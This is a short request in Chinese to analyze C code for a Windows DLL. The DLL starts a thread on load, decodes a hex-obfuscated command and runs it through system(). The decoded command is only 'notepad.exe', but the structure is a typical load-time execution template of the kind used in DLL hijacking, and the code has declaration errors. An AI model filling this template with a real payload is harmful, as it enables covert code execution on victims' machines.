分析这段代码#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BackgroundTask, NULL, 0, NULL);
            break;
    }
    return TRUE;
}

void BackgroundTask() {
    char pseudoCmd[] = { 0x6e, 0x6f, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00 };

    for (int i = 0; i < 5; i++) {
        Sleep(100);
    }

    ExecuteCommand(pseudoCmd);
}

void ExecuteCommand(char* command) {
    system(command);
}

